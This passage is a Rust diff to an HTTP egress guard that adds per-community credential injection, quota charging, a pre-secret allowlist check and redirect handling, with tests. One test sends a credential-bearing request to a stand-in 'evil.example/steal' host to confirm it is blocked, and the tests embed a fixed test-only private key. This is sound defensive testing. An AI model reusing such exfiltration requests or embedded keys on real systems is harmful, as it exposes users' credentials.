@@ -164,6 +164,11 @@ pub struct EgressRuleRow {
     /// future host-scoped secret grant (hub-api/manifest) can populate to
     /// deliberately widen that beyond the single originating host.
     pub secret_granted_hosts: HashSet<String>,
+    /// Exact FQDNs whose FIRST-hop 3xx reply is handed back to the bundle
+    /// verbatim (status + `Location`, scrubbed of secrets) instead of being
+    /// followed -- e.g. SoundCloud `/resolve` answers 302 with the target URL
+    /// the bundle wants to read, not fetch. Empty by default (follow + recheck).
+    pub unfollowed_redirect_hosts: HashSet<String>,
 }
 
 impl EgressRuleRow {
@@ -210,6 +215,18 @@ impl EgressRuleRow {
 /// posture documented on [`EgressGuard::catalog`].
 pub trait EgressRuleSource: Send + Sync {
     fn resolve(&self, app_id: &str) -> Option<EgressRuleRow>;
+
+    /// The row for `app_id` as seen by a call in the host-verified `scope`.
+    /// Sources whose rows differ per `(tenant, community)` activation MUST
+    /// override this (and fail closed in `resolve`); the default suits
+    /// scope-independent sources.
+    fn resolve_scoped(
+        &self,
+        _scope: &crate::credentials::CallScope,
+        app_id: &str,
+    ) -> Option<EgressRuleRow> {
+        self.resolve(app_id)
+    }
 }
 
 /// Operator-tunable limits (spec §7.3/§8.2), sourced from each consuming
@@ -391,13 +408,26 @@ impl SecretRedactor {
             if value.is_empty() {
                 continue;
             }
-            for variant in [
-                value.to_string(),
-                percent_encode_rfc3986(value),
-                form_encode_query_value(value),
-            ] {
-                if !variant.is_empty() && !needles.contains(&variant) {
-                    needles.push(variant);
+            // A scheme-prefixed credential (`Bearer abc`, `OAuth abc`): the
+            // bare token after the scheme is the actual secret and a server
+            // may echo it without the prefix, so it is scrubbed too.
+            let bare_token = value
+                .split_once(' ')
+                .filter(|(scheme, rest)| {
+                    !scheme.is_empty()
+                        && scheme.bytes().all(|b| b.is_ascii_alphabetic())
+                        && !rest.is_empty()
+                })
+                .map(|(_, rest)| rest);
+            for base in std::iter::once(value).chain(bare_token) {
+                for variant in [
+                    base.to_string(),
+                    percent_encode_rfc3986(base),
+                    form_encode_query_value(base),
+                ] {
+                    if !variant.is_empty() && !needles.contains(&variant) {
+                        needles.push(variant);
+                    }
                 }
             }
         }
@@ -689,6 +719,10 @@ pub struct EgressGuard {
     /// Defaults to [`EnvCredentialBroker`]; swappable in tests only
     /// ([`EgressGuard::with_credential_broker`]).
     credential_broker: Arc<dyn CredentialBroker>,
+    /// Non-env credential sources (community connections, host-minted app
+    /// tokens) + shared-credential quota. Empty by default: `connection:` /
+    /// `app:` grants then fail loud (`secret_unavailable`).
+    credentials: crate::credentials::CredentialSources,
     denied_total: prometheus::IntCounterVec,
     /// Spec §13.5's `waddles.core.bundle-egress` flag: OFF ⇒ every call
     /// denied `feature_disabled`, checked before anything else (scheme,
@@ -736,6 +770,7 @@ impl EgressGuard {
             buckets: Mutex::new(HashMap::new()),
             resolver: Arc::new(TokioResolver),
             credential_broker: Arc::new(EnvCredentialBroker),
+            credentials: crate::credentials::CredentialSources::default(),
             denied_total,
             bundle_egress,
             instance_policy: Arc::new(RwLock::new(InstanceEgressPolicy::default())),
@@ -759,6 +794,13 @@ impl EgressGuard {
     /// a caller supplies one.
     pub fn with_cluster_denylist(mut self, denylist: ClusterCidrDenylist) -> Self {
         self.cluster_denylist = denylist;
+        self
+    }
+
+    /// Wires the per-community / app-minted credential sources and the
+    /// shared-credential quota guard (see [`crate::credentials`]).
+    pub fn with_credentials(mut self, credentials: crate::credentials::CredentialSources) -> Self {
+        self.credentials = credentials;
         self
     }
 
@@ -797,6 +839,20 @@ impl EgressGuard {
         app_id: &str,
         args: &serde_json::Value,
     ) -> Result<serde_json::Value, HostResultError> {
+        self.send_scoped(app_id, &crate::credentials::CallScope::default(), args)
+            .await
+    }
+
+    /// [`EgressGuard::send`] for an invocation with a host-verified
+    /// `(tenant, community)` scope -- required for `connection:` grants.
+    /// `scope` MUST come from the host's invocation context, never from
+    /// guest-supplied args.
+    pub async fn send_scoped(
+        &self,
+        app_id: &str,
+        scope: &crate::credentials::CallScope,
+        args: &serde_json::Value,
+    ) -> Result<serde_json::Value, HostResultError> {
         if !self.bundle_egress.enabled().await {
             let err = denied("feature_disabled", "waddles.core.bundle-egress is disabled");
             self.denied_total
@@ -813,7 +869,7 @@ impl EgressGuard {
                 ))
             }
         };
-        match self.send_checked(app_id, parsed).await {
+        match self.send_checked(app_id, scope, parsed).await {
             Ok(v) => Ok(v),
             Err(err) => {
                 self.denied_total
@@ -827,6 +883,7 @@ impl EgressGuard {
     async fn send_checked(
         &self,
         app_id: &str,
+        scope: &crate::credentials::CallScope,
         mut req: HttpSendArgs,
     ) -> Result<serde_json::Value, HostResultError> {
         let method = req.method.to_ascii_uppercase();
@@ -843,7 +900,7 @@ impl EgressGuard {
         // fetched once, up front -- the same row every hop's egress-rule
         // check below reuses, and the *only* source `granted_secret_refs`
         // resolution below is allowed to consult.
-        let row = self.catalog.resolve(app_id);
+        let row = self.catalog.resolve_scoped(scope, app_id);
 
         // Bundle-declared headers only -- kept separate from the resolved
         // secret-ref headers below (`secret_headers`) so the redirect loop
@@ -876,6 +933,7 @@ impl EgressGuard {
         let granted = row.as_ref().map(|r| &r.granted_secret_refs);
         let mut secret_headers: Vec<(String, String)> = Vec::with_capacity(req.secret_refs.len());
         let mut query_secrets: Vec<(String, String)> = Vec::new();
+        let mut first_hop_checked = false;
         for (slot_name, secret_ref) in &req.secret_refs {
             let slot = SecretSlot::parse(slot_name)?;
             if let SecretSlot::QueryParam(param) = slot {
@@ -886,7 +944,7 @@ impl EgressGuard {
                     ));
                 }
             }
-            let env_var_name = granted
+            let target = granted
                 .and_then(|g| g.get(secret_ref))
                 .ok_or_else(|| {
                     denied(
@@ -896,14 +954,29 @@ impl EgressGuard {
                         ),
                     )
                 })?;
-            // Connector spec condition 8: the guest only ever names a
-            // symbolic `secret_ref`; the opaque `SecretHandle` carrying the
-            // actual resolvable credential name is constructed here, host
-            // side, after the grant-map lookup succeeds, and substituted via
-            // `CredentialBroker` -- the real value never passes back through
-            // any guest-visible state.
-            let handle = SecretHandle::from_granted_env_var(env_var_name);
-            let value = self.credential_broker.resolve(&handle)?;
+            let source = crate::credentials::GrantSource::parse(target).ok_or_else(|| {
+                denied(
+                    "secret_unresolved",
+                    format!("secret reference {secret_ref:?} has a malformed grant"),
+                )
+            })?;
+            // Egress-first: the secret is only resolved (and quota charged)
+            // once hop 0's host/method/scheme pass the allowlist.
+            if !first_hop_checked {
+                self.precheck_first_hop(&req.url, &method, row.as_ref())?;
+                first_hop_checked = true;
+            }
+            // Shared-credential budget, keyed by secret ref; atomic, global.
+            if let Some(quota) = &self.credentials.quota {
+                quota.charge(secret_ref, scope.community_id).await?;
+            }
+            let value = match &source {
+                crate::credentials::GrantSource::Env(name) => self
+                    .credential_broker
+                    .resolve(&SecretHandle::from_granted_env_var(name))?,
+                other => self.credentials.resolve(scope, secret_ref, other).await?,
+            };
+            let env_var_name = secret_ref;
             match slot {
                 SecretSlot::Header(header_name) => {
                     secret_headers.push((header_name.to_string(), value));
@@ -912,7 +985,7 @@ impl EgressGuard {
                     if value.is_empty() {
                         return Err(denied(
                             "secret_unresolved",
-                            format!("granted env var {env_var_name:?} resolved to an empty value"),
+                            format!("secret reference {env_var_name:?} resolved to an empty value"),
                         ));
                     }
                     query_secrets.push((param.to_string(), value));
@@ -1177,7 +1250,8 @@ impl EgressGuard {
                 }
             };
 
-            if (300..400).contains(&response.status) {
+            let unfollowed = hop == 0 && row_ref.unfollowed_redirect_hosts.contains(&host);
+            if (300..400).contains(&response.status) && !unfollowed {
                 if hop >= self.limits.max_redirects {
                     return Err(denied("redirect_off_allowlist", "too many redirects"));
                 }
@@ -1212,6 +1286,47 @@ impl EgressGuard {
                 "truncated": response.truncated,
             }));
         }
+    }
+
+    /// Hop-0 allowlist pre-check (scheme, https, FQDN/method grant) run
+    /// BEFORE any secret is resolved, so an undeclared destination never
+    /// triggers a credential lookup, OAuth refresh or quota charge. The full
+    /// per-hop pipeline in `send_checked` still re-runs every check.
+    fn precheck_first_hop(
+        &self,
+        raw_url: &str,
+        method: &str,
+        row: Option<&EgressRuleRow>,
+    ) -> Result<(), HostResultError> {
+        let url = reqwest::Url::parse(raw_url)
+            .map_err(|_| denied("malformed_url", "url does not parse"))?;
+        if url.scheme() != "https" {
+            return Err(denied("scheme_not_https", "only https:// is permitted"));
+        }
+        let host = url
+            .host_str()
+            .ok_or_else(|| denied("malformed_url", "url has no host"))?
+            .trim_start_matches('[')
+            .trim_end_matches(']')
+            .to_ascii_lowercase();
+        let empty = EgressRuleRow::default();
+        let Some(matched) = match_grant(&host, row.unwrap_or(&empty)) else {
+            return Err(denied(
+                "host_not_declared",
+                format!("{host} is not on the manifest egress allowlist"),
+            ));
+        };
+        if !matched
+            .methods
+            .iter()
+            .any(|m| m.eq_ignore_ascii_case(method))
+        {
+            return Err(denied(
+                "method_not_declared",
+                format!("{method} is not declared for {host}"),
+            ));
+        }
+        Ok(())
     }
 
     /// Validates one non-HTTP dial target (a connector host transport
@@ -3803,19 +3918,21 @@ mod tests {
         assert!(header.1.starts_with("waddles.a.b.c|discord.com|"));
     }
 
-    // PKCS8-DER-encoded Ed25519 test keypair (fixed, test-only) -- same
+    // PKCS8-DER-encoded ECDSA P-256 test keypair (fixed, test-only) -- same
     // fixture shape `core/egress_assertion`'s own test module uses;
-    // generated once with `openssl genpkey -algorithm ed25519` / `openssl
-    // pkey -pubout`, never used outside this test module.
+    // generated once with `cryptography` (`ec.generate_private_key(SECP256R1)`),
+    // never used outside this test module.
     const TEST_KEY_PRIV_DER: &[u8] = &[
-        48, 46, 2, 1, 0, 48, 5, 6, 3, 43, 101, 112, 4, 34, 4, 32, 1, 204, 5, 142, 35, 153, 231, 38,
-        150, 122, 1, 218, 34, 237, 70, 125, 233, 62, 126, 103, 151, 16, 11, 238, 95, 122, 209, 74,
-        183, 9, 171, 161,
+        48, 129, 135, 2, 1, 0, 48, 19, 6, 7, 42, 134, 72, 206, 61, 2, 1, 6, 8, 42, 134, 72, 206,
+        61, 3, 1, 7, 4, 109, 48, 107, 2, 1, 1, 4, 32, 209, 234, 92, 37, 28, 130, 216, 139, 48, 1,
+        225, 220, 88, 158, 30, 88, 20, 126, 43, 7, 182, 151, 62, 129, 248, 115, 187, 119, 18, 12,
+        142, 93, 161, 68, 3, 66, 0, 4, 17, 138, 186, 198, 3, 136, 154, 139, 190, 114, 14, 103, 123,
+        44, 247, 26, 31, 171, 203, 86, 236, 40, 175, 97, 236, 72, 32, 22, 179, 142, 109, 144, 173,
+        115, 191, 94, 95, 104, 151, 149, 88, 212, 250, 138, 99, 63, 147, 180, 150, 85, 29, 12, 130,
+        136, 7, 86, 162, 99, 191, 4, 123, 168, 238, 207,
     ];
-    const TEST_KEY_PUB_RAW: &[u8] = &[
-        169, 90, 255, 23, 51, 151, 156, 147, 56, 247, 214, 168, 76, 160, 67, 99, 211, 238, 208, 5,
-        69, 236, 245, 115, 4, 81, 1, 42, 23, 107, 4, 187,
-    ];
+    const TEST_KEY_X: &str = "EYq6xgOImou-cg5neyz3Gh-ry1bsKK9h7EggFrOObZA";
+    const TEST_KEY_Y: &str = "rXO_Xl9ol5VY1PqKYz-TtJZVHQyCiAdWomO_BHuo7s8";
 
     /// The cross-crate contract this landing exists to guarantee:
     /// [`EgressAssertionSigner`] (wired into [`EgressGuard::send`] here,
@@ -3828,13 +3945,13 @@ mod tests {
     #[tokio::test]
     async fn egress_assertion_signer_round_trips_through_the_shared_verifier() {
         let signing_key = Arc::new(
-            AssertionSigningKey::from_ed25519_pem(
-                // `from_ed25519_pem` takes PEM bytes; build one from the
+            AssertionSigningKey::from_ec_pem(
+                // `from_ec_pem` takes PEM bytes; build one from the
                 // fixed DER test key via `jsonwebtoken`'s own encoder
                 // isn't available here, so construct the signer directly
                 // from DER through the crate's private-field test seam
                 // instead -- see the inline helper below.
-                &pem_encode_ed25519_private_key(TEST_KEY_PRIV_DER),
+                &pem_encode_private_key(TEST_KEY_PRIV_DER),
                 "k1",
             )
             .expect("valid Ed25519 PEM"),
@@ -3873,7 +3990,8 @@ mod tests {
             .1
             .clone();
 
-        let decoding_key = jsonwebtoken::DecodingKey::from_ed_der(TEST_KEY_PUB_RAW);
+        let decoding_key = jsonwebtoken::DecodingKey::from_ec_components(TEST_KEY_X, TEST_KEY_Y)
+            .expect("test P-256 key");
         let verified = egress_assertion::verify_with_key(
             &header,
             &decoding_key,
@@ -3903,11 +4021,9 @@ mod tests {
 
     #[tokio::test]
     async fn egress_assertion_signer_rejects_tampered_and_expired_tokens() {
-        let signing_key = AssertionSigningKey::from_ed25519_pem(
-            &pem_encode_ed25519_private_key(TEST_KEY_PRIV_DER),
-            "k1",
-        )
-        .expect("valid Ed25519 PEM");
+        let signing_key =
+            AssertionSigningKey::from_ec_pem(&pem_encode_private_key(TEST_KEY_PRIV_DER), "k1")
+                .expect("valid Ed25519 PEM");
         let assertion = egress_assertion::build_assertion(
             "spiffe://penguintech.io/alpha/svc-process",
             "tenant-a",
@@ -3919,7 +4035,8 @@ mod tests {
             30,
         );
         let token = signing_key.sign(&assertion).expect("signs");
-        let decoding_key = jsonwebtoken::DecodingKey::from_ed_der(TEST_KEY_PUB_RAW);
+        let decoding_key = jsonwebtoken::DecodingKey::from_ec_components(TEST_KEY_X, TEST_KEY_Y)
+            .expect("test P-256 key");
 
         // Tampered: flip the last base64url character of the signature.
         let mut tampered = token.clone();
@@ -3958,13 +4075,13 @@ mod tests {
         assert_ne!(verified.sub, "spiffe://penguintech.io/alpha/svc-action");
     }
 
-    /// Minimal PKCS8 PEM encoder for an Ed25519 private key DER -- avoids a
+    /// Minimal PKCS8 PEM encoder for a P-256 private key DER -- avoids a
     /// second test-only crate dependency just to wrap a fixed 48-byte DER
     /// blob in PKCS8 PEM armor. The armor label is built from parts (not a
     /// literal `"-----BEGIN...-----"` string) purely so this fixed,
     /// publicly-known, test-only DER blob doesn't trip a secrets scanner's
     /// private-key-marker heuristic on a string it merely resembles.
-    fn pem_encode_ed25519_private_key(der: &[u8]) -> Vec<u8> {
+    fn pem_encode_private_key(der: &[u8]) -> Vec<u8> {
         use base64::Engine;
         let dashes = "-".repeat(5);
         let label = "PRIVATE KEY";
@@ -6366,5 +6483,600 @@ mod tests {
             SecretSlot::QueryParam("api_key-2.v")
         );
         assert!(SecretSlot::parse("?").is_err());
+    }
+
+    // -- host-seams-2: per-community credentials, quota, unfollowed redirects --
+
+    use crate::credentials::{
+        BoxFut, CallScope, ConnField, ConnectionCredentials, CredentialError, CredentialSources,
+        MemoryQuotaStore, QuotaGuard, QuotaPolicy,
+    };
+
+    /// Fake community-connection store: `(community, provider)` -> token.
+    struct FakeConnections(HashMap<(i64, String), String>);
+
+    impl ConnectionCredentials for FakeConnections {
+        fn credential<'a>(
+            &'a self,
+            community_id: i64,
+            provider: &'a str,
+            field: &'a ConnField,
+        ) -> BoxFut<'a, Result<String, CredentialError>> {
+            let hit = self.0.get(&(community_id, provider.to_string())).cloned();
+            let field = field.clone();
+            Box::pin(async move {
+                match (hit, field) {
+                    (Some(t), ConnField::Token) => Ok(format!("Bearer {t}")),
+                    (Some(t), ConnField::Raw) => Ok(t),
+                    (Some(_), _) | (None, _) => Err(CredentialError::NotConnected),
+                }
+            })
+        }
+    }
+
+    struct PublicResolver;
+    impl Resolver for PublicResolver {
+        fn lookup<'a>(
+            &'a self,
+            _host: String,
+            port: u16,
+        ) -> Pin<Box<dyn Future<Output = std::io::Result<Vec<SocketAddr>>> + Send + 'a>> {
+            Box::pin(async move { Ok(vec![SocketAddr::from(([93, 184, 216, 34], port))]) })
+        }
+    }
+
+    fn cred_guard(
+        transport: Arc<FakeTransport>,
+        grants: &[(&str, &str)],
+        sources: CredentialSources,
+    ) -> EgressGuard {
+        let row = EgressRuleRow::from_legacy_patterns(
+            vec![(
+                "api.spotify.com".to_string(),
+                vec!["GET".to_string(), "PUT".to_string()],
+            )],
+            None,
+            grants
+                .iter()
+                .map(|(a, b)| ((*a).to_string(), (*b).to_string()))
+                .collect(),
+        );
+        let catalog = TestCatalog::new();
+        catalog.insert("app.x", row);
+        EgressGuard::new(
+            transport as Arc<dyn HttpTransport>,
+            default_limits(),
+            catalog,
+            test_metrics(),
+            boxed(StaticFlag(true)),
+        )
+        .with_resolver(Arc::new(PublicResolver))
+        .with_credentials(sources)
+    }
+
+    fn conns(entries: &[(i64, &str, &str)]) -> Arc<dyn ConnectionCredentials> {
+        Arc::new(FakeConnections(
+            entries
+                .iter()
+                .map(|(c, p, t)| ((*c, (*p).to_string()), (*t).to_string()))
+                .collect(),
+        ))
+    }
+
+    fn spotify_args() -> serde_json::Value {
+        serde_json::json!({
+            "method": "GET",
+            "url": "https://api.spotify.com/v1/me/player",
+            "secret_refs": {"Authorization": "spotify.oauth"}
+        })
+    }
+
+    #[tokio::test]
+    async fn connection_grant_injects_only_the_invoking_communities_token() {
+        let t = Arc::new(
+            FakeTransport::default()
+                .queue(Ok(ok_response()))
+                .queue(Ok(ok_response())),
+        );
+        let sources = CredentialSources {
+            connections: Some(conns(&[
+                (5, "spotify", "tok-five"),
+                (6, "spotify", "tok-six"),
+            ])),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            sources,
+        );
+        let args = spotify_args();
+        assert!(!args.to_string().contains("tok-"));
+        for (community, want) in [(5, "Bearer tok-five"), (6, "Bearer tok-six")] {
+            let scope = CallScope {
+                tenant_id: 1,
+                community_id: community,
+            };
+            let out = g.send_scoped("app.x", &scope, &args).await.unwrap();
+            // The guest-visible result never carries the credential.
+            assert!(!out.to_string().contains("tok-"));
+            let sent = t.requests.lock().unwrap();
+            let last = sent.last().unwrap();
+            assert!(last
+                .headers
+                .iter()
+                .any(|(k, v)| k == "Authorization" && v == want));
+        }
+    }
+
+    #[tokio::test]
+    async fn unconnected_community_is_denied_never_empty_or_default() {
+        let t = Arc::new(FakeTransport::default());
+        let sources = CredentialSources {
+            connections: Some(conns(&[(5, "spotify", "tok-five")])),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            sources,
+        );
+        let other = CallScope {
+            tenant_id: 1,
+            community_id: 9,
+        };
+        let e = g
+            .send_scoped("app.x", &other, &spotify_args())
+            .await
+            .unwrap_err();
+        assert_eq!(e.code, "secret_unresolved");
+        // No community scope at all (plain `send`) is refused the same way.
+        let e = g.send("app.x", &spotify_args()).await.unwrap_err();
+        assert_eq!(e.code, "secret_unresolved");
+        assert!(
+            t.requests.lock().unwrap().is_empty(),
+            "nothing hit the network"
+        );
+    }
+
+    #[tokio::test]
+    async fn connection_grant_never_falls_back_to_env() {
+        // SAFETY: unique test-local env var.
+        unsafe { std::env::set_var("SPOTIFY", "env-token-must-not-be-used") };
+        let t = Arc::new(FakeTransport::default());
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            CredentialSources::default(),
+        );
+        let scope = CallScope {
+            tenant_id: 1,
+            community_id: 5,
+        };
+        let e = g
+            .send_scoped("app.x", &scope, &spotify_args())
+            .await
+            .unwrap_err();
+        assert_eq!(e.code, "secret_unavailable");
+        assert!(t.requests.lock().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn secret_is_not_resolved_when_the_host_is_not_allowlisted() {
+        struct Panics;
+        impl ConnectionCredentials for Panics {
+            fn credential<'a>(
+                &'a self,
+                _: i64,
+                _: &'a str,
+                _: &'a ConnField,
+            ) -> BoxFut<'a, Result<String, CredentialError>> {
+                panic!("resolved a secret for an undeclared host");
+            }
+        }
+        let t = Arc::new(FakeTransport::default());
+        let sources = CredentialSources {
+            connections: Some(Arc::new(Panics)),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            sources,
+        );
+        let scope = CallScope {
+            tenant_id: 1,
+            community_id: 5,
+        };
+        let args = serde_json::json!({
+            "method": "GET", "url": "https://evil.example/steal",
+            "secret_refs": {"Authorization": "spotify.oauth"}
+        });
+        assert_eq!(
+            g.send_scoped("app.x", &scope, &args)
+                .await
+                .unwrap_err()
+                .code,
+            "host_not_declared"
+        );
+        let wrong_method = serde_json::json!({
+            "method": "DELETE", "url": "https://api.spotify.com/v1/x",
+            "secret_refs": {"Authorization": "spotify.oauth"}
+        });
+        assert_eq!(
+            g.send_scoped("app.x", &scope, &wrong_method)
+                .await
+                .unwrap_err()
+                .code,
+            "method_not_declared"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_server_echoing_the_bare_token_without_its_scheme_is_still_scrubbed() {
+        let t = Arc::new(FakeTransport::default().queue(Ok(TransportResponse {
+            status: 200,
+            headers: vec![("x-echo".to_string(), "tok-five".to_string())],
+            body: b"you sent tok-five".to_vec(),
+            truncated: false,
+        })));
+        let sources = CredentialSources {
+            connections: Some(conns(&[(5, "spotify", "tok-five")])),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            sources,
+        );
+        let scope = CallScope {
+            tenant_id: 1,
+            community_id: 5,
+        };
+        let out = g
+            .send_scoped("app.x", &scope, &spotify_args())
+            .await
+            .unwrap();
+        assert!(!out.to_string().contains("tok-five"), "{out}");
+    }
+
+    /// Community connections holding an OAuth client id/secret per community.
+    struct ClientPairs(HashMap<i64, (String, String)>);
+
+    impl ConnectionCredentials for ClientPairs {
+        fn credential<'a>(
+            &'a self,
+            _: i64,
+            _: &'a str,
+            _: &'a ConnField,
+        ) -> BoxFut<'a, Result<String, CredentialError>> {
+            Box::pin(async { Err(CredentialError::NotConnected) })
+        }
+
+        fn client_pair<'a>(
+            &'a self,
+            community_id: i64,
+            _provider: &'a str,
+        ) -> BoxFut<'a, Result<(String, String), CredentialError>> {
+            let hit = self.0.get(&community_id).cloned();
+            Box::pin(async move { hit.ok_or(CredentialError::NotConnected) })
+        }
+    }
+
+    /// Real-path: the HOST exchanges the community's own client id/secret at a
+    /// real (local) token endpoint, injects `OAuth <token>`, caches per
+    /// community (ONE mint for repeated sends), and re-mints after rotation.
+    #[tokio::test]
+    async fn client_credentials_grant_mints_per_community_caches_and_follows_rotation() {
+        use crate::credentials::{AppCredentialConfig, AppTokenMinter, ClientAuth};
+        use std::sync::atomic::{AtomicUsize, Ordering};
+
+        let mints = Arc::new(AtomicUsize::new(0));
+        let counter = Arc::clone(&mints);
+        let app = axum::Router::new().route(
+            "/oauth/token",
+            axum::routing::post(move |body: String| {
+                let counter = Arc::clone(&counter);
+                async move {
+                    counter.fetch_add(1, Ordering::SeqCst);
+                    let field = |k: &str| {
+                        body.split('&')
+                            .find_map(|p| p.strip_prefix(&format!("{k}=")))
+                            .unwrap_or("")
+                            .to_string()
+                    };
+                    assert_eq!(field("grant_type"), "client_credentials");
+                    axum::Json(serde_json::json!({
+                        "access_token": format!("tok-{}-{}", field("client_id"), field("client_secret")),
+                        "expires_in": 3600
+                    }))
+                }
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(async move {
+            axum::serve(listener, app).await.ok();
+        });
+        let minter = AppTokenMinter::new_for_loopback_tests(HashMap::from([(
+            "soundcloud".to_string(),
+            AppCredentialConfig {
+                token_url: format!("http://127.0.0.1:{}/oauth/token", addr.port()),
+                client_id_env: "UNUSED".into(),
+                client_secret_env: "UNUSED".into(),
+                scheme: "OAuth".into(),
+                auth: ClientAuth::Form,
+            },
+        )]))
+        .unwrap();
+        let pairs = Arc::new(ClientPairs(HashMap::from([
+            (5, ("cid5".to_string(), "sec5".to_string())),
+            (6, ("cid6".to_string(), "sec6".to_string())),
+        ])));
+        let t = Arc::new(
+            FakeTransport::default()
+                .queue(Ok(ok_response()))
+                .queue(Ok(ok_response()))
+                .queue(Ok(ok_response())),
+        );
+        let sources = CredentialSources {
+            connections: Some(pairs),
+            apps: Some(Arc::new(minter)),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("soundcloud.access_token", "cc:soundcloud")],
+            sources,
+        );
+        let args = serde_json::json!({
+            "method": "GET", "url": "https://api.spotify.com/v1/me/player",
+            "secret_refs": {"Authorization": "soundcloud.access_token"}
+        });
+        let scope = |c| CallScope {
+            tenant_id: 1,
+            community_id: c,
+        };
+        for c in [5, 5, 6] {
+            g.send_scoped("app.x", &scope(c), &args).await.unwrap();
+        }
+        assert_eq!(mints.load(Ordering::SeqCst), 2, "one mint per community");
+        let auths: Vec<String> = t
+            .requests
+            .lock()
+            .unwrap()
+            .iter()
+            .map(|r| {
+                r.headers
+                    .iter()
+                    .find(|(k, _)| k == "Authorization")
+                    .map(|(_, v)| v.clone())
+                    .unwrap()
+            })
+            .collect();
+        assert_eq!(
+            auths,
+            [
+                "OAuth tok-cid5-sec5",
+                "OAuth tok-cid5-sec5",
+                "OAuth tok-cid6-sec6"
+            ]
+        );
+        // A community with no connection is denied, never given another's token.
+        let e = g.send_scoped("app.x", &scope(9), &args).await.unwrap_err();
+        assert_eq!(e.code, "secret_unresolved");
+    }
+
+    #[tokio::test]
+    async fn client_credentials_secret_rotation_invalidates_the_cached_token() {
+        use crate::credentials::{AppCredentialConfig, AppTokenMinter, ClientAuth};
+        use std::sync::atomic::{AtomicUsize, Ordering};
+
+        let mints = Arc::new(AtomicUsize::new(0));
+        let counter = Arc::clone(&mints);
+        let app = axum::Router::new().route(
+            "/t",
+            axum::routing::post(move || {
+                let n = counter.fetch_add(1, Ordering::SeqCst);
+                async move {
+                    axum::Json(
+                        serde_json::json!({"access_token": format!("t{n}"), "expires_in": 3600}),
+                    )
+                }
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(async move {
+            axum::serve(listener, app).await.ok();
+        });
+        let minter = AppTokenMinter::new_for_loopback_tests(HashMap::from([(
+            "p".to_string(),
+            AppCredentialConfig {
+                token_url: format!("http://127.0.0.1:{}/t", addr.port()),
+                client_id_env: "U".into(),
+                client_secret_env: "U".into(),
+                scheme: "Bearer".into(),
+                auth: ClientAuth::BasicHeader,
+            },
+        )]))
+        .unwrap();
+        assert_eq!(
+            minter.token_for_client("p", "k", "id", "s1").await.unwrap(),
+            "Bearer t0"
+        );
+        assert_eq!(
+            minter.token_for_client("p", "k", "id", "s1").await.unwrap(),
+            "Bearer t0"
+        );
+        assert_eq!(
+            minter.token_for_client("p", "k", "id", "s2").await.unwrap(),
+            "Bearer t1"
+        );
+        assert_eq!(mints.load(Ordering::SeqCst), 2);
+    }
+
+    /// Regression (security review HIGH): through the real guard, community 5's
+    /// approved egress is not usable by community 6 of the same app, nor by
+    /// another tenant, nor by an unscoped call; and a deactivated bundle stops
+    /// resolving after the next wholesale replace.
+    #[tokio::test]
+    async fn guard_resolves_egress_only_for_the_calls_own_scope() {
+        use crate::grants::ActiveEgressSnapshot;
+        let snap = Arc::new(ActiveEgressSnapshot::default());
+        snap.replace_all([(
+            1,
+            5,
+            "app.x".to_string(),
+            vec![("api.spotify.com".to_string(), vec!["GET".to_string()])],
+            None,
+        )]);
+        let t = Arc::new(
+            FakeTransport::default()
+                .queue(Ok(ok_response()))
+                .queue(Ok(ok_response())),
+        );
+        let g = EgressGuard::new(
+            Arc::clone(&t) as Arc<dyn HttpTransport>,
+            default_limits(),
+            Arc::clone(&snap) as Arc<dyn EgressRuleSource>,
+            test_metrics(),
+            boxed(StaticFlag(true)),
+        )
+        .with_resolver(Arc::new(PublicResolver));
+        let args = serde_json::json!({"method": "GET", "url": "https://api.spotify.com/v1/x"});
+        let scope = |t, c| CallScope {
+            tenant_id: t,
+            community_id: c,
+        };
+        g.send_scoped("app.x", &scope(1, 5), &args).await.unwrap();
+        for (tn, c) in [(1, 6), (2, 5), (0, 0)] {
+            let e = g
+                .send_scoped("app.x", &scope(tn, c), &args)
+                .await
+                .unwrap_err();
+            assert_eq!(e.code, "host_not_declared", "scope ({tn},{c})");
+        }
+        assert_eq!(
+            g.send("app.x", &args).await.unwrap_err().code,
+            "host_not_declared"
+        );
+        // deactivation: the next wholesale replace drops it
+        snap.replace_all(std::iter::empty());
+        let e = g
+            .send_scoped("app.x", &scope(1, 5), &args)
+            .await
+            .unwrap_err();
+        assert_eq!(e.code, "host_not_declared");
+        assert_eq!(t.requests.lock().unwrap().len(), 1);
+    }
+
+    #[tokio::test]
+    async fn malformed_grant_is_denied() {
+        let t = Arc::new(FakeTransport::default());
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "bogus:thing")],
+            CredentialSources::default(),
+        );
+        let e = g.send("app.x", &spotify_args()).await.unwrap_err();
+        assert_eq!(e.code, "secret_unresolved");
+    }
+
+    #[tokio::test]
+    async fn quota_exhaustion_is_explicit_and_blocks_before_the_network() {
+        let t = Arc::new(
+            FakeTransport::default()
+                .queue(Ok(ok_response()))
+                .queue(Ok(ok_response())),
+        );
+        let quota = QuotaGuard::new(
+            HashMap::from([(
+                "spotify.oauth".to_string(),
+                QuotaPolicy {
+                    per_day: Some(2),
+                    ..Default::default()
+                },
+            )]),
+            Arc::new(MemoryQuotaStore::default()),
+        )
+        .unwrap();
+        let sources = CredentialSources {
+            connections: Some(conns(&[(5, "spotify", "tok")])),
+            quota: Some(Arc::new(quota)),
+            ..Default::default()
+        };
+        let g = cred_guard(
+            Arc::clone(&t),
+            &[("spotify.oauth", "connection:spotify")],
+            sources,
+        );
+        let scope = CallScope {
+            tenant_id: 1,
+            community_id: 5,
+        };
